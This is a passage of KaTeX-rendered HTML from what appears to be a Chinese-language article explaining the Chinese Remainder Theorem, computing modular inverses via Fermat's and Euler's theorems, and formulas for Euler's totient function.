style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>M</mi><mi>i</mi><mrow><mo>−</mo><mn>1</mn></mrow></msubsup></mrow><annotation encoding="application/x-tex">M_ {i}^ {-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.131103em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.4231360000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span></span></span></span> ( <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">m_ {i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> )(1 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩽</mo></mrow><annotation encoding="application/x-tex">\leqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⩽</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩽</mo></mrow><annotation encoding="application/x-tex">\leqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⩽</span></span></span></span> r)</p><p>即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x_ {0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">b_ {1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_ {1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_ {1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> + <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">b_ {2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_ {2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_ {2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> + <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋯</mo></mrow><annotation encoding="application/x-tex">\cdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.31em;vertical-align:0em;"></span><span class="minner">⋯</span></span></span></span> +  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>r</mi></msub><msub><mi>M</mi><mi>r</mi></msub><msub><mi>y</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">b_ {r}M_{r} y_{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为该同余方程组的唯一解。</p><p>根据同余方程组，我们可以很方便的求得b、M的值，但是y的值需要对对应的M值求逆元得到，所以我们要做的实际上就是求解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub><msub><mi>y</mi><mi>i</mi></msub><mo>≡</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msub><mi>m</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">M_{i}y_{i}\equiv1\bmod m_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>而求解逆元的方法可参考我们在文首提到的费马小定理，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><msubsup><mi>M</mi><mi>i</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow></msubsup><mo>≡</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msub><mi>m</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_{i}=M_{i}^{φ(m_i)-1}\equiv\bmod m_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.321664em;vertical-align:-0.27686399999999994em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27686399999999994em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(m_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>是m的欧拉函数。如果m是质数，那么它的欧拉函数就等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi(m) = m - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>；如果m是合数，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m) = \varphi(p_1) \varphi(p_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m)=(p_1-1)(p_2-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，或者<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mn>1</mn></msub></mfrac><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>…</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mi>r</mi></msub></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\phi(n)=n\left(1-\frac{1}{p_{1}}\right)\left(1-\frac{1}{p_{2}}\right) \ldots\left(1-\frac{1}{p_{r}}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.80002em;vertical-align:-0.65002em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 